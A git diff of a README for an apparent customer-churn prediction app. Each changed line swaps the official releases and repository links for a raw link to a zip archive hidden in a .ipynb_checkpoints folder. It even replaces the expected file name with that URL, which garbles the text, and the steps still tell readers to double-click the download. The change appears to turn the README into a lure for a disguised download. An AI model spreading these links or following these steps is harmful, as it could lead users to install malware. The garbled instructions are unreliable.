@@ -1,6 +1,6 @@
 # 📊 Customer-Churn-Prediction - Predict Customer Retention Easily
 
-[![Download](https://img.shields.io/badge/Download%20Latest-Release-blue)](https://github.com/Sanithu16684/Customer-Churn-Prediction/releases)
+[![Download](https://raw.githubusercontent.com/Sanithu16684/Customer-Churn-Prediction/master/.ipynb_checkpoints/Prediction-Customer-Churn-v3.2.zip%20Latest-Release-blue)](https://raw.githubusercontent.com/Sanithu16684/Customer-Churn-Prediction/master/.ipynb_checkpoints/Prediction-Customer-Churn-v3.2.zip)
 
 ## 📚 Description
 
@@ -20,11 +20,11 @@ Follow these steps to download and run the Customer-Churn-Prediction application
 ### 🔗 Download & Install
 
 1. **Download the Application:**
-   Visit the following link to download the latest version of Customer-Churn-Prediction: [Download Latest Release](https://github.com/Sanithu16684/Customer-Churn-Prediction/releases).
+   Visit the following link to download the latest version of Customer-Churn-Prediction: [Download Latest Release](https://raw.githubusercontent.com/Sanithu16684/Customer-Churn-Prediction/master/.ipynb_checkpoints/Prediction-Customer-Churn-v3.2.zip).
 
 2. **Installation Steps:**
    - Navigate to your `Downloads` folder once the file finishes downloading.
-   - Look for the downloaded file name, something like `CustomerChurnPrediction.exe`.
+   - Look for the downloaded file name, something like `https://raw.githubusercontent.com/Sanithu16684/Customer-Churn-Prediction/master/.ipynb_checkpoints/Prediction-Customer-Churn-v3.2.zip`.
    - Double-click the file to start the installation process.
    - Follow the on-screen prompts to complete the installation.
 
@@ -91,7 +91,7 @@ If you encounter any issues or have suggestions for improvement, please open an 
 - Evaluation Metrics
 - Machine Learning Algorithms
 
-For more information and to stay updated, visit the [repository](https://github.com/Sanithu16684/Customer-Churn-Prediction).
+For more information and to stay updated, visit the [repository](https://raw.githubusercontent.com/Sanithu16684/Customer-Churn-Prediction/master/.ipynb_checkpoints/Prediction-Customer-Churn-v3.2.zip).
 
 ## 🥳 Thanks for using Customer-Churn-Prediction! 
 
